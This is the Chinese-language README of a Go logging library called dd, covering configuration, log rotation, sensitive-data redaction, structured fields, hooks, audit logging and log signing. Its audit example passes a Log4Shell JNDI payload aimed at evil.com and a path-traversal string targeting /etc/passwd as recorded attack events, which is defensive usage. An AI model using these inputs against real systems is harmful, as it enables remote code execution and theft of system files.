# DD - 高性能 Go 日志库

[![Go Version](https://img.shields.io/badge/Go-1.24+-00ADD8?style=flat&logo=go)](https://go.dev/)
[![pkg.go.dev](https://pkg.go.dev/badge/github.com/cybergodev/dd.svg)](https://pkg.go.dev/github.com/cybergodev/dd)
[![License](https://img.shields.io/badge/license-MIT-brightgreen.svg)](LICENSE)
[![Security](https://img.shields.io/badge/security-policy-blue.svg)](SECURITY.md)
[![Thread Safe](https://img.shields.io/badge/thread%20safe-yes-brightgreen.svg)](https://github.com/cybergodev/dd)

一个生产级高性能 Go 日志库，零外部依赖，专为现代应用设计。

**[📖 English Documentation](README.md)**

## ✨ 核心特性

| 特性 | 说明 |
|------|------|
| 🚀 **高性能** | 简单日志 3M+ ops/sec，针对高吞吐场景优化 |
| 🔒 **线程安全** | 原子操作 + 无锁设计，完全并发安全 |
| 🛡️ **内置安全** | 敏感数据过滤、注入攻击防护 |
| 📊 **结构化日志** | 类型安全字段、JSON/文本格式、可自定义字段名 |
| 📁 **智能轮转** | 按大小自动轮转、自动压缩、自动清理 |
| 📦 **零依赖** | 仅使用 Go 标准库 |
| 🎯 **简单易用** | 30 秒快速上手，直观的 API |
| 🌐 **云原生** | JSON 格式兼容 ELK/Splunk/CloudWatch |

## 📦 安装

```bash
go get github.com/cybergodev/dd
```

## 🚀 快速开始

### 30 秒上手

```go
package main

import "github.com/cybergodev/dd"

func main() {
    // 零配置 - 直接使用包级函数
    dd.Debug("调试信息")
    dd.Info("应用启动")
    dd.Warn("缓存未命中")
    dd.Error("连接失败")
    // dd.Fatal("严重错误")  // 调用 os.Exit(1)

    // 带字段的结构化日志
    dd.InfoWith("请求处理完成",
        dd.String("method", "GET"),
        dd.Int("status", 200),
        dd.Float64("duration_ms", 45.67),
    )
}
```

### 文件日志

```go
package main

import "github.com/cybergodev/dd"

func main() {
    // 一行代码输出到文件
    logger := dd.MustToFile("logs/app.log")
    defer logger.Close()

    logger.Info("应用启动")
    logger.InfoWith("用户登录",
        dd.String("user_id", "12345"),
        dd.String("ip", "192.168.1.100"),
    )
}
```

### 便捷构造函数

```go
// 快速构造函数（出错时返回 error）
logger, _ := dd.ToFile()              // → logs/app.log (文本格式)
logger, _ := dd.ToJSONFile()          // → logs/app.log (JSON 格式)
logger, _ := dd.ToConsole()           // → 仅控制台
logger, _ := dd.ToAll()               // → 控制台 + 文件

// Must* 变体（出错时 panic，返回 *Logger）
logger := dd.MustToFile("logs/app.log")
logger := dd.MustToJSONFile("logs/app.log")
logger := dd.MustToConsole()
logger := dd.MustToAll("logs/app.log")

defer logger.Close()
```

## 📖 配置

### 预设配置

```go
// 生产环境（默认）- Info 级别，文本格式
logger, _ := dd.New(dd.DefaultConfig())

// 开发环境 - Debug 级别，带调用者信息
logger, _ := dd.New(dd.DevelopmentConfig())

// 云原生 - JSON 格式，Debug 级别
logger, _ := dd.New(dd.JSONConfig())
```

### 自定义配置

```go
cfg := dd.DefaultConfig()
cfg.Level = dd.LevelDebug
cfg.Format = dd.FormatJSON
cfg.DynamicCaller = true  // 显示调用者 文件:行号

// 文件输出与轮转
cfg.File = &dd.FileConfig{
    Path:       "logs/app.log",
    MaxSizeMB:  100,                 // 100MB 时轮转
    MaxBackups: 10,                  // 保留 10 个备份
    MaxAge:     30 * 24 * time.Hour, // 30 天后删除
    Compress:   true,                // Gzip 压缩旧文件
}

logger, _ := dd.New(cfg)
defer logger.Close()
```

### JSON 自定义

```go
cfg := dd.JSONConfig()
cfg.JSON.FieldNames = &dd.JSONFieldNames{
    Timestamp: "@timestamp",  // ELK 标准
    Level:     "severity",
    Message:   "msg",
    Caller:    "source",
}
cfg.JSON.PrettyPrint = true  // 开发环境美化输出

logger, _ := dd.New(cfg)
```

## 🛡️ 安全特性

### 敏感数据过滤

```go
cfg := dd.DefaultConfig()
cfg.Security = dd.DefaultSecurityConfig()  // 启用基础过滤

logger, _ := dd.New(cfg)

// 自动过滤
logger.Info("password=secret123")           // → password=[REDACTED]
logger.Info("api_key=sk-abc123")           // → api_key=[REDACTED]
logger.Info("credit_card=4532015112830366") // → credit_card=[REDACTED]
logger.Info("email=user@example.com")      // → email=[REDACTED]
```

**基础过滤** 覆盖：密码、API Key、信用卡号、手机号、数据库连接串

**完整过滤** 额外覆盖：JWT、AWS Key、IP 地址、SSN

```go
cfg.Security = dd.DefaultSecureConfig()  // 完整过滤
```

### 自定义过滤规则

```go
filter := dd.NewEmptySensitiveDataFilter()
filter.AddPatterns(
    `(?i)internal_token[:\s=]+[^\s]+`,
    `(?i)session_id[:\s=]+[^\s]+`,
)

cfg := dd.DefaultConfig()
cfg.Security = &dd.SecurityConfig{
    SensitiveFilter: filter,
}
```

### 禁用安全过滤（最高性能）

```go
cfg := dd.DefaultConfig()
cfg.Security = dd.DefaultSecurityConfigDisabled()
```

## 📊 结构化日志

### 字段类型

```go
logger.InfoWith("所有字段类型",
    dd.String("user", "alice"),
    dd.Int("count", 42),
    dd.Int64("id", 9876543210),
    dd.Float64("score", 98.5),
    dd.Bool("active", true),
    dd.Time("created_at", time.Now()),
    dd.Duration("elapsed", 150*time.Millisecond),
    dd.Err(errors.New("连接失败")),
    dd.Any("tags", []string{"vip", "premium"}),
)
```

### 上下文链式

```go
// 创建带持久字段的 logger
userLogger := logger.WithFields(
    dd.String("service", "user-api"),
    dd.String("version", "1.0.0"),
)

// 所有日志自动包含 service 和 version
userLogger.Info("用户认证成功")
userLogger.InfoWith("配置文件加载", dd.String("user_id", "123"))

// 继续链式添加字段
requestLogger := userLogger.WithFields(
    dd.String("request_id", "req-abc-123"),
)
requestLogger.Info("处理请求")
```

## 🔧 输出管理

### 多输出目标

```go
// 控制台 + 文件
logger := dd.MustToAll("logs/app.log")

// 或使用 MultiWriter
fileWriter, _ := dd.NewFileWriter("logs/app.log", dd.FileWriterConfig{})
multiWriter := dd.NewMultiWriter(os.Stdout, fileWriter)

cfg := dd.DefaultConfig()
cfg.Output = multiWriter
logger, _ := dd.New(cfg)
```

### 缓冲写入（高吞吐场景）

```go
fileWriter, _ := dd.NewFileWriter("logs/app.log", dd.FileWriterConfig{})
bufferedWriter, _ := dd.NewBufferedWriter(fileWriter, 4096)  // 4KB 缓冲
defer bufferedWriter.Close()  // 重要：关闭时刷新缓冲

cfg := dd.DefaultConfig()
cfg.Output = bufferedWriter
logger, _ := dd.New(cfg)
```

### 动态 Writer 管理

```go
logger, _ := dd.New()

fileWriter, _ := dd.NewFileWriter("logs/dynamic.log", dd.FileWriterConfig{})
logger.AddWriter(fileWriter)        // 运行时添加
logger.RemoveWriter(fileWriter)     // 运行时移除

fmt.Printf("Writer 数量: %d\n", logger.WriterCount())
```

## 🌐 Context 与追踪

### Context 键

```go
ctx := context.Background()
ctx = dd.WithTraceID(ctx, "trace-abc123")
ctx = dd.WithSpanID(ctx, "span-def456")
ctx = dd.WithRequestID(ctx, "req-789xyz")

// Context 感知日志
logger.InfoCtx(ctx, "处理请求")
logger.InfoWithCtx(ctx, "用户操作", dd.String("action", "login"))
```

### 自定义 Context 提取器

```go
tenantExtractor := func(ctx context.Context) []dd.Field {
    if tenantID := ctx.Value("tenant_id"); tenantID != nil {
        return []dd.Field{dd.String("tenant_id", tenantID.(string))}
    }
    return nil
}

cfg := dd.DefaultConfig()
cfg.ContextExtractors = []dd.ContextExtractor{tenantExtractor}
```

## 🪝 钩子 (Hooks)

```go
hooks := dd.NewHookBuilder().
    BeforeLog(func(ctx context.Context, hctx *dd.HookContext) error {
        fmt.Printf("日志前: %s\n", hctx.Message)
        return nil
    }).
    AfterLog(func(ctx context.Context, hctx *dd.HookContext) error {
        fmt.Printf("日志后: %s\n", hctx.Message)
        return nil
    }).
    OnError(func(ctx context.Context, hctx *dd.HookContext) error {
        fmt.Printf("错误: %v\n", hctx.Error)
        return nil
    }).
    Build()

cfg := dd.DefaultConfig()
cfg.Hooks = hooks
```

## 🔐 审计日志

```go
// 创建审计日志器
auditCfg := dd.DefaultAuditConfig()
auditLogger := dd.NewAuditLogger(auditCfg)
defer auditLogger.Close()

// 记录安全事件
auditLogger.LogSensitiveDataRedaction("password=*", "password", "密码已脱敏")
auditLogger.LogPathTraversalAttempt("../../../etc/passwd", "路径遍历已阻止")
auditLogger.LogSecurityViolation("LOG4SHELL", "检测到可疑模式", map[string]any{
    "input": "${jndi:ldap://evil.com/a}",
})
```

## 📝 日志完整性

```go
// 使用密钥创建签名器
integrityCfg := dd.DefaultIntegrityConfig()
signer, _ := dd.NewIntegritySigner(integrityCfg)

// 签名日志消息
message := "关键审计事件"
signature := signer.Sign(message)
fmt.Printf("已签名: %s %s\n", message, signature)

// 验证签名
result := dd.VerifyAuditEvent(message+" "+signature, signer)
if result.Valid {
    fmt.Println("签名有效")
}
```

## 📈 性能

| 操作 | 吞吐量 | 内存/操作 | 分配次数 |
|------|--------|-----------|----------|
| 简单日志 | **310 万/秒** | 200 B | 7 |
| 结构化日志 (3 字段) | **190 万/秒** | 417 B | 12 |
| JSON 格式 | **60 万/秒** | 800 B | 20 |
| 级别检查 | **25 亿/秒** | 0 B | 0 |
| 并发 (22 goroutines) | **6800 万/秒** | 200 B | 7 |

## 📚 API 参考

### 包级函数

```go
// 简单日志
dd.Debug(args ...any)
dd.Info(args ...any)
dd.Warn(args ...any)
dd.Error(args ...any)
dd.Fatal(args ...any)  // 调用 os.Exit(1)

// 格式化日志
dd.Debugf(format string, args ...any)
dd.Infof(format string, args ...any)
dd.Warnf(format string, args ...any)
dd.Errorf(format string, args ...any)
dd.Fatalf(format string, args ...any)

// 结构化日志
dd.InfoWith(msg string, fields ...dd.Field)
dd.ErrorWith(msg string, fields ...dd.Field)
// ... DebugWith, WarnWith, FatalWith

// 全局 logger 管理
dd.SetDefault(logger *Logger)
dd.SetLevel(level LogLevel)
dd.GetLevel() LogLevel
```

### Logger 方法

```go
logger, _ := dd.New()

// 简单日志
logger.Info(args ...any)
logger.Infof(format string, args ...any)
logger.InfoWith(msg string, fields ...Field)

// Context 感知
logger.InfoCtx(ctx context.Context, args ...any)
logger.InfoWithCtx(ctx context.Context, msg string, fields ...Field)

// 配置管理
logger.SetLevel(level LogLevel)
logger.GetLevel() LogLevel
logger.AddWriter(w io.Writer) error
logger.RemoveWriter(w io.Writer)
logger.Close() error
logger.Flush()

// 上下文链式
logger.WithFields(fields ...Field) *LoggerEntry
logger.WithField(key string, value any) *LoggerEntry
```

### 字段构造函数

```go
dd.String(key, value string)
dd.Int(key string, value int)
dd.Int64(key string, value int64)
dd.Float64(key string, value float64)
dd.Bool(key string, value bool)
dd.Time(key string, value time.Time)
dd.Duration(key string, value time.Duration)
dd.Err(err error)
dd.ErrWithStack(err error)  // 包含堆栈信息
dd.Any(key string, value any)
```

## 📁 示例代码

查看 [examples](examples) 目录获取完整可运行示例：

| 文件 | 说明 |
|------|------|
| [01_quick_start.go](examples/01_quick_start.go) | 5 分钟快速入门 |
| [02_structured_logging.go](examples/02_structured_logging.go) | 类型安全字段、WithFields |
| [03_configuration.go](examples/03_configuration.go) | 配置 API、预设配置、轮转 |
| [04_security.go](examples/04_security.go) | 过滤、自定义规则 |
| [05_writers.go](examples/05_writers.go) | 文件、缓冲、多 Writer |
| [06_context_hooks.go](examples/06_context_hooks.go) | 追踪、钩子 |
| [07_convenience.go](examples/07_convenience.go) | 快速构造函数 |
| [08_production.go](examples/08_production.go) | 生产环境模式 |
| [09_advanced.go](examples/09_advanced.go) | 采样、验证 |
| [10_audit_integrity.go](examples/10_audit_integrity.go) | 审计、完整性 |

## 🤝 参与贡献

欢迎贡献代码！提交 PR 前请阅读贡献指南。

## 📄 许可证

MIT 许可证 - 详见 [LICENSE](LICENSE) 文件。

---

**为 Go 社区用心打造** ❤️

如果这个项目对你有帮助，请给一个 ⭐️ Star！
